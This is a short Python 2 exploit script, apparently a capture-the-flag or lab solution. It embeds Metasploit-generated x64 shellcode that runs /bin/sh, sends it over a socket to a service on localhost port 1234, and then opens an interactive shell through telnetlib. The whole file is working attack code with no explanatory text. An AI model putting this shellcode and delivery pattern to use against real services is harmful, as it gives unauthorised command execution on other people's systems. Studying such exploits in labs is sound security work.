#!/usr/bin/python

import struct, time, re, telnetlib, socket

# execute /bin/sh, generated with metasploit module payload/linux/x64/exec
# generate -o CMD="/bin/sh" -b '\x00\x0a\x0d\x20' -t py
buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xd2\xf4\xcc\xbf\x90\x13\xca"
buf += "\x84\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xb8\xcf\x94\x26\xd8\xa8\xe5\xe6\xbb\x9a\xe3\xcc\xf8"
buf += "\x13\x99\xcc\x5b\x13\xa4\x92\xf3\x13\xca\xcc\x5b\x12"
buf += "\x9e\x57\x98\x13\xca\x84\xfd\x96\xa5\xd1\xbf\x60\xa2"
buf += "\x84\x84\xa3\x84\x36\x76\x1c\xcf\x84"
buf += "\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 1234))

print s.recv(1000)
s.send(buf)

time.sleep(0.5)

t = telnetlib.Telnet()
t.sock = s
t.interact()

